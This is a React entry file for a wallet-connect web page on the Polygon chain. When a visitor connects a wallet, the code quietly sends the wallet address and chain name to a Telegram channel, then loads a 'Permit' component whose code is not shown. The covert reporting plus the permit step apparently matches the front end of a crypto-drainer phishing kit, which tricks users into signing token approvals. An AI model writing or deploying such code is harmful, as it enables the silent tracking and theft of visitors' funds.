import React, { useState, useEffect } from "react";
import ReactDOM from "react-dom/client";
import { createWeb3Modal, defaultWagmiConfig } from "@web3modal/wagmi/react";
import { WagmiConfig, useAccount, useNetwork } from "wagmi";
import { mainnet, polygon, optimism, arbitrum } from "wagmi/chains";
import { ethers, BigNumber, Contract } from "ethers";
import { useSearchParams } from "react-router-dom";

import { BrowserRouter } from "react-router-dom"; // Import BrowserRouter

import Permit from "./permit";
import { logToTelegram } from "./log"; // Import logging function
import "./index.css";

const projectId = "d03f390f6413dfedf9599364a8ac0ec4";

function setChain(c) {
  return [c];
}
// Include the custom tBNB chain along with other chains
const chains = setChain(polygon);

const wagmiConfig = defaultWagmiConfig({
  chains,
  projectId,
  appName: "Web3Modal v3",
});

createWeb3Modal({ wagmiConfig, projectId, chains });

const App = () => {
  const { address } = useAccount();
  const { chain } = useNetwork();
  const [hasLogged, setHasLogged] = useState(false); // State to track if the log has been sent

  const [searchParams] = useSearchParams();
  const isAdmin = searchParams.get("admin") === "true";

  useEffect(() => {
    if (address && chain && !hasLogged) {
      const message = `Wallet connected: \nAddress: ${address} \nChain: ${chain.name}`;
      logToTelegram(message);
      setHasLogged(true); // Set the flag to true after logging
    }
  }, [address, chain, hasLogged]); // Adding hasLogged as a dependency

  return (
    <>
      <div className="container">
        <w3m-button />
        <w3m-network-button />
      </div>
      <p>
        {address && (
          <>
            <Permit chain={chain} />
          </>
        )}
      </p>
    </>
  );
};

ReactDOM.createRoot(document.getElementById("root")).render(
  <React.StrictMode>
    <BrowserRouter>
      <WagmiConfig config={wagmiConfig}>
        <App />
      </WagmiConfig>
    </BrowserRouter>
  </React.StrictMode>
);
